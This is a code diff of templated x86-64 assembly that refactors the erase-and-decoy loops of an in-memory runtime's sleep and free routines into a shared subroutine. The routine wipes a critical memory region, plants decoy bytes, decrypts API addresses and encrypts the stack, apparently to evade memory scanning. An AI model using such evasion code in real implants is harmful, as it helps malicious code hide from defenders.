@@ -87,31 +87,8 @@ method_sleep:
   // decrypt address of WaitForSingleObject
   xor [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}
 
-  // erase critical memory
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
-  shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
-  xor {{.RegV.r9}}, {{.RegV.r9}}               {{iji}} // calculate zero value
- loop_erase:
-  mov [{{.RegV.rcx}}], {{.RegV.r9}}            {{iji}} // erase data
-  add {{.RegV.rcx}}, 8                         {{iji}} // add critical address
-  dec {{.RegV.rdx}}                            {{iji}} // update loop count
-  jnz loop_erase                               {{iji}} // check need erase next
-
-  // fill critical memory with decoy
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set decoy address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy size (loop count)
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
-  test {{.RegV.rdx}}, {{.RegV.rdx}}            {{iji}} // check decoy size is zero
-  jz skip_decoy                                {{iji}} // check need skip
- loop_decoy:
-  movzx {{.RegV.r8}}, byte ptr [{{.RegV.rcx}}] {{iji}} // load one byte from decoy
-  mov [{{.RegV.rax}}], {{.RegV.r8b}}           {{iji}} // write one byte to critical
-  inc {{.RegV.rcx}}                            {{iji}} // update decoy address
-  inc {{.RegV.rax}}                            {{iji}} // update critical address
-  dec {{.RegV.rdx}}                            {{iji}} // update loop count
-  jnz loop_decoy                               {{iji}} // check need fill next
- skip_decoy:
+  // erase critical memory and deploy decoy
+  call decoy                                   {{iji}}
 
   // prepare argument before encrypt stack
   xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // clear register
@@ -169,33 +146,11 @@ method_sleep:
   ret                                          {{iji}}
 
 method_free:
-  mov {{.RegN.rbp}}, rcx                       {{iji}} // save structure pointer
+  // save structure pointer
+  mov {{.RegN.rbp}}, rcx                       {{iji}}
 
-  // erase critical memory
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
-  shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
-  xor {{.RegV.r9}}, {{.RegV.r9}}               {{iji}} // zero value
- loop_erase_free:
-  mov [{{.RegV.rcx}}], {{.RegV.r9}}            {{iji}} // erase data
-  add {{.RegV.rcx}}, 8                         {{iji}} // next field
-  dec {{.RegV.rdx}}                            {{iji}} // update loop count
-  jnz loop_erase_free                          {{iji}} // check need erase next
-
-  // fill critical memory with decoy
-  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set decoy address
-  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy size (loop count)
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
-  test {{.RegV.rdx}}, {{.RegV.rdx}}            {{iji}} // check decoy size is zero
-  jz skip_decoy_free                           {{iji}} // check need skip
- loop_decoy_free:
-  movzx {{.RegV.r8}}, byte ptr [{{.RegV.rcx}}] {{iji}} // load one byte from decoy
-  mov [{{.RegV.rax}}], {{.RegV.r8b}}           {{iji}} // write one byte to critical
-  inc {{.RegV.rcx}}                            {{iji}} // update decoy address
-  inc {{.RegV.rax}}                            {{iji}} // update critical address
-  dec {{.RegV.rdx}}                            {{iji}} // update loop count
-  jnz loop_decoy_free                          {{iji}} // check need fill next
- skip_decoy_free:
+  // erase critical memory and deploy decoy
+  call decoy                                   {{iji}}
 
   // free critical memory
   mov {{.RegV.rax}}, [{{.RegN.rbp}} + 1*8]     {{iji}} // get address of VirtualFree
@@ -224,6 +179,35 @@ xor_buf:
   add {{.RegV.rax}}, 8                         {{iji}} // add destination address
   dec {{.RegV.rdx}}                            {{iji}} // update loop count
   jnz loop_xor                                 {{iji}} // check need decrypt again
+  ret                                          {{iji}}
+
+decoy:
+  // erase critical memory
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
+  shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
+  xor {{.RegV.r9}}, {{.RegV.r9}}               {{iji}} // calculate zero value
+ loop_erase:
+  mov [{{.RegV.rcx}}], {{.RegV.r9}}            {{iji}} // erase data
+  add {{.RegV.rcx}}, 8                         {{iji}} // add critical address
+  dec {{.RegV.rdx}}                            {{iji}} // update loop count
+  jnz loop_erase                               {{iji}} // check need erase next
+
+  // fill critical memory with decoy
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set decoy address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy size (loop count)
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
+  test {{.RegV.rdx}}, {{.RegV.rdx}}            {{iji}} // check decoy size is zero
+  jz skip_decoy                                {{iji}} // check need skip fill
+ loop_decoy:
+  movzx {{.RegV.r8}}, byte ptr [{{.RegV.rcx}}] {{iji}} // load one byte from decoy
+  mov [{{.RegV.rax}}], {{.RegV.r8b}}           {{iji}} // write one byte to critical
+  inc {{.RegV.rcx}}                            {{iji}} // update decoy address
+  inc {{.RegV.rax}}                            {{iji}} // update critical address
+  dec {{.RegV.rdx}}                            {{iji}} // update loop count
+  jnz loop_decoy                               {{iji}} // check need fill next
+
+ skip_decoy:
   ret                                          {{iji}}
 
 protect:
